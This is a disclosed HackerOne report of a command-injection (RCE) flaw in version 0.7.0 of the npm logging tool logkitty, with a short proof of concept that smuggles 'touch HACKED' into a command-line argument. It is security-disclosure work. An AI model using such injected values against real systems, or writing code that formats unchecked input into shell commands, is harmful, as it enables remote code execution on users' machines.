# [logkitty] RCE via insecure command formatting

## Report Details
- **Report ID**: 825729
- **URL**: https://hackerone.com/reports/825729
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-03-21T00:53:36.972Z
- **Disclosed**: 2020-05-09T08:42:11.023Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `logkitty` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `logkitty`
**version:** `0.7.0`
**npm page:** `https://www.npmjs.com/package/logkitty`

## Module Description
> Display pretty Android and iOS logs without Android Studio or Console.app, with intuitive Command Line Interface.

## Module Stats
[170,222] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/zamotany/logkitty/blob/master/src/android/adb.ts#L55

## Steps To Reproduce:
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i logkitty # Install affected module
logkitty android app 'test; touch HACKED' #  Note the *touch command* is inside the *'* (single quote), so it's an argument, while it will be executed anyway
```
1. Recheck the files: now `HACKED` has been created :) {F754955}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `logkitty`

## Attachments
- Screenshot_from_2020-03-21_01-46-19.png
